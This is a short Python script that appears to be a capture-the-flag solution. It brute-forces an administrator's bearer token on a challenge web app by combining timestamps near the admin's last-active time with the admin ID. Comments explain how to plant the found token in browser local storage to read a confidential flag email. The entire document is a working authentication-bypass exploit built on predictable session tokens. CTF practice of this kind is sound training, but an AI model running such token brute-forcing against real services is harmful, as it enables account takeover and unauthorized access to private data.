from datetime import datetime, timezone, timedelta
import requests

# Convert the basetime to timezone UTC+2 (because the server works with UTC timezone, but my local time is UTC+2)
# Admin last active: 2026-04-13T14:27 (visible at the bottom of the home page)
base_time = datetime(2026, 4, 13, 14, 27, tzinfo=timezone.utc).astimezone(timezone(offset=timedelta(hours=2)))
print("\nBase time:", base_time)

URL = "http://c96f26ff-f166-4dbd-b26f-ad8f4b3ab9aa.offsec.m0lecon.it:8001/api/inbox"

# The USER token is generated as: token = user login timestamp + "00X" (where X = user_id)
# The ADMIN token is generated as: token = admin login timestamp + "001" (where 1 = admin_id)
# NOTE: It is enough to brute-force the token by trying timestamps around the admin's last active time, since the token is likely generated around that time.
# However, we don't know the exact timestamp (the seconds are not visibile), so we will try a range of timestamps around 60 seconds from the base timestamp.

for sec in range(60):
    ts = int(base_time.timestamp())

    ts += sec  # try different seconds

    token = str(ts) + "001"  # admin ID = 1

    headers = {
        "Authorization": f"Bearer {token}"
    }

    r = requests.get(URL, headers=headers)

    try:
        print(f"Trying token: {token}")
        data = r.json()

        if len(data) > 0 and "error" not in data:
            print(f"\nVALID TOKEN FOUND: {token}")
            print(data)
            print()
            
            break

    except:
        continue

# AFTER RUNNING THE SCRIPT:
# Once the valid token is found, go to the "Application" tab on the browser's DevTools, then "Local Storage",
# and substitute the "flagmail_token" value with the valid token found.
# Then refresh the page to see the confidential email containing the flag!